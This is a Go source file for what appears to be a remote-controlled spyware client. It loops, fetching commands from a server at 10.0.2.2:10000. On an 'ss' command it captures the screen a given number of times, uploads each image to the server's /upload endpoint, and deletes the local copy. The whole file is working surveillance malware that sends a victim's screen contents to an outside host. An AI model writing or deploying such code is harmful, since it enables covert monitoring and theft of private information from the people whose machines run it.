package main

import (
	"fmt"
	"image/png"
	"io"
	"net/http"
	"os"
	"strconv"
	"strings"
	"time"

	"github.com/vova616/screenshot"
)

var serverIp string = "http://10.0.2.2:10000"
var userInput string = ""

func ss() {
	img, err := screenshot.CaptureScreen()
	if err != nil {
		panic(err)
	}
	f, err := os.Create("./ss.webp")
	if err != nil {
		panic(err)
	}
	err = png.Encode(f, img)
	if err != nil {
		panic(err)
	}
	f.Close()
}

func sendFile(filePath string, mediaType string) string {
	Path := filePath
	file, err := os.Open(Path)
	if err != nil {
		panic(err)
	}
	defer file.Close()

	// Prepare the network request targeting Machine A's IP address
	targetURL := "http://10.0.2.2:10000/upload"
	req, err := http.NewRequest("POST", targetURL, file)
	if err != nil {
		panic(err)
	}

	// Attach metadata instructions in the headers
	req.Header.Set("X-Media-Type", mediaType)
	req.Header.Set("X-File-Name", Path)

	// Dispatch the stream
	client := &http.Client{}
	resp, err := client.Do(req)
	if err != nil {
		panic(err)
	}
	defer resp.Body.Close()
	os.Remove(Path)
	var output string = "Server Response Status: " + resp.Status
	return (output)
}

func fetchCommand() string {

	resp, err := http.Get(serverIp + "/get-command")
	if err != nil {
		fmt.Println("Error connecting to server:", err)
		return "idle"
	}

	defer resp.Body.Close()

	bodyBytes, err := io.ReadAll(resp.Body)
	if err != nil {
		fmt.Println("Error reading response:", err)
		return "idle"
	}

	return string(bodyBytes)
}

// command to play sounds the server defines built for mp3
func playSound() {

}

func main() {
	for true {
		userInput = fetchCommand()
		command := strings.Fields(userInput)
		time.Sleep(2 * time.Second)
		fmt.Printf("Received command from server: %s\n", userInput)

		switch command[0] {

		case "idle":
			time.Sleep(5 * time.Second)

		case "ss":
			i := 0
			fmt.Println("Using numeric value")

			n, err := strconv.Atoi(command[1])

			if err != nil {
				fmt.Println(err)
			}

			for i < n {
				ss()
				output := sendFile("./ss.webp", "image")
				fmt.Println(output)
				time.Sleep(500 * time.Millisecond)
				fmt.Println(i)
				i++
			}

		default:
			time.Sleep(2 * time.Second)

		}
	}
}
